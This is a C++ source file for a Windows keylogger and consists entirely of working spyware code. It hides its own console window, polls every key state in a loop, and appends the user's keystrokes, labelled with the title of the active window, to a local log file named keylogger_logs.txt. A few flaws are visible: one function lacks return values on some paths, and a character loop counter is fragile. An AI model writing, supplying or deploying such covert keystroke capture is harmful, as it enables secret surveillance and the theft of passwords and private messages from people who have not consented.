#include <stdio.h>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <tlhelp32.h> 
#include <string>

using namespace std;
using std::fstream;
using std::ofstream;

string GetActiveWindowTitle()
{
	wchar_t wnd_title[256];
	HWND hwnd = GetForegroundWindow();
	GetWindowText(hwnd, wnd_title, sizeof(wnd_title));
	std::wstring ws(wnd_title);
	string str(ws.begin(), ws.end());
	return str;
}


void WriteData(string Text) {
	ofstream LogFile;
	LogFile.open("keylogger_logs.txt", fstream::app);
	LogFile << Text;
	LogFile.close();

}

void HideCmd() {
	HWND hWnd;
	AllocConsole();
	hWnd = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hWnd, 0);
}

bool isKeyListed(int vKey) {
	switch (vKey) {
	case VK_RETURN:
		WriteData("\n");
		break;
	case VK_BACK:
		WriteData("\b");
		break;
	case VK_SPACE:
		WriteData(" ");
		break;
	case VK_SHIFT:
		WriteData(" *shift* ");
		break;
	case VK_OEM_PERIOD:
		WriteData(".");
		break;
	case VK_NUMPAD0:
		WriteData("0");
		break;
	case VK_NUMPAD1:
		WriteData("1");
		break;
	case VK_NUMPAD2:
		WriteData("2");
		break;
	case VK_NUMPAD3:
		WriteData("3");
		break;
	case VK_NUMPAD4:
		WriteData("4");
		break;
	case VK_NUMPAD5:
		WriteData("5");
		break;
	case VK_NUMPAD6:
		WriteData("6");
		break;
	case VK_NUMPAD7:
		WriteData("7");
		break;
	case VK_NUMPAD8:
		WriteData("8");
		break;
	case VK_NUMPAD9:
		WriteData("9");
		break;
	case VK_OEM_1:
		WriteData(":");
		break;
	case VK_TAB:
		WriteData("TAB");
		break;

	default: return false;
	}
}

int main() {
	HideCmd();
	string ProcName = GetActiveWindowTitle();
	char Key;
	while (1) {
		for (long x = 0; x <= 300000; x++) {
			for (Key = 8; Key <= 255; Key++) {
				if (GetAsyncKeyState(Key) == -32767) {
					if (isKeyListed(Key) == 0) {
						ofstream LogFile;
						LogFile.open("keylogger_logs.txt", fstream::app);
						if (ProcName == GetActiveWindowTitle()) {
							LogFile << "[" << ProcName << "]" << ":" << Key << endl;
							LogFile.close();
						}
						else
						{
							ProcName = GetActiveWindowTitle();
							LogFile << "[" << ProcName << "]" << ":" << Key << endl;
							LogFile.close();
						}



					}
				}
			}

		}
	}
}

